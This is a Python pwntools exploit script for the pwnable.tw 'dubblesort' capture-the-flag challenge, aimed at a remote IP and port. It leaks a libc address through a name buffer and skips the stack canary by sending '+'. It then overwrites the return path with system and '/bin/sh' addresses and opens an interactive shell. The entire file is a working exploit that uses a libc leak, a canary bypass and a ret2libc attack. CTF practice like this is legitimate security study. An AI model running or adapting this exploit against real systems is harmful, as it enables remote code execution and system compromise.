#Exploit for pwnable.tw/dubblesort
from pwn import *
#target = process('./dubblesort', env = {'LD_PRELOAD':'./libc_32.so.6'})
#target = remote('chall.pwnable.tw', 10101)
target = remote('220.249.52.134', 41800)
libc = ELF('./libc_32.so.6')
print target.recvuntil("What your name :")
target.sendline("A"*24)
print target.recvuntil("Hello " + "A"*24 + "\n")
leak = target.recv(3)
leak = u32("\x00" + leak)
offset = 0x1b0000
libcBase = leak - offset
log.info("libcBase : " + hex(libcBase))
system = libcBase + libc.symbols['system']
#strings -tx libc_32.so.6 | grep "/bin/sh"
# 158e8b /bin/sh
Binsh = libcBase + 0x158e8b
oneShot = libcBase + 0x5f066
print target.sendlineafter("sort :", "36")
def sendnum(num, n):
	for i in range(n):
		target.sendlineafter("number : ", str(num))
sendnum(14, 24)
sendnum("+", 1)
sendnum(system, 8)
sendnum(Binsh, 3)
target.interactive()

